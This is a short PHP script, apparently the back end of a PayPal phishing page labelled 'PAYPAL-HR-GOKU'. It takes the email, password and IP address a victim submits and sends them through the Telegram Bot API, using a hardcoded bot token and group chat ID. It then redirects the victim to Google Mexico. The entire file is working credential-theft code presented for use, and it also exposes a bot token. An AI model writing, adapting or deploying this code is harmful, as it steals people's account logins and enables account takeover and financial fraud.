
<?php
header('Content-Type: text/html; charset=utf-8');

$user_ip = $_SERVER['REMOTE_ADDR'];

// Datos del formulario
$login_email = $_POST['login_email'];
$login_password = $_POST['login_password'];
$user_ip = $_SERVER['REMOTE_ADDR'];

// ID del grupo de Telegram
$chatId = '-1001667964659'; // Reemplaza esto con el ID de tu grupo

// Token de tu bot de Telegram
$botToken = '6101623188:AAHe68-C0OtB00q6pDjc7JLBZEQqqFNpVl0';

// Mensaje a enviar
$message = "PAYPAL-HR-GOKU\n\n";
$message .= "Email: $login_email\n";
$message .= "Password: $login_password\n";
$message .= "IP address: $user_ip\n";

// URL de la API de Telegram
$url = "https://api.telegram.org/bot$botToken/";

// Envío del mensaje al grupo
$sendMessageUrl = $url . "sendMessage?chat_id=$chatId&text=" . urlencode($message);
file_get_contents($sendMessageUrl);

// Redireccionar a google.com.mx
header("Location: https://www.google.com.mx");
exit;
?>
```

